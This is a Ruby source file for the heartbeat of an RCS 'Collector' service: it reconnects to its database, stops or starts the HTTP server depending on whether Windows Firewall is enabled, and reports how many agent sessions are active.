require 'rcs-common/trace'
require 'rcs-common/systemstatus'
require 'rcs-common/heartbeat'
require 'rcs-common/winfirewall'

require_relative 'sessions'
require_relative 'firewall'

module RCS
  module Collector
    class HeartBeat < RCS::HeartBeat::Base
      component :collector

      before_heartbeat do
        # if the database connection has gone
        # try to re-login to the database again
        unless DB.instance.connected?
          trace :debug, "heartbeat: try to reconnecto to rcs-db"
          DB.instance.connect!(:carrier)
        end

        # still no luck ?  return and wait for the next iteration
        !!DB.instance.connected?
      end

      after_heartbeat do
        if firewall_disabled?
          trace(:error, "Firewall is disabled. You must turn it on. The http server will #{HttpServer.running? ? 'stop now' : 'remain disabled'}")
          HttpServer.stop
        elsif !HttpServer.running?
          HttpServer.start
        end
      end

      def firewall_disabled?
        @_firewall_disabled ||= (!Firewall.developer_machine? and Firewall.disabled?)
      end

      def status
        firewall_disabled? ? 'ERROR' : super()
      end

      def message
        if firewall_disabled?
          return "Windows Firewall is disabled"
        end

        # retrieve how many session we have
        # this number represents the number of agent that are synchronizing
        active_sessions = SessionManager.instance.length

        # if we are serving agents, report it accordingly
        message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle..."
      end
    end
  end
end
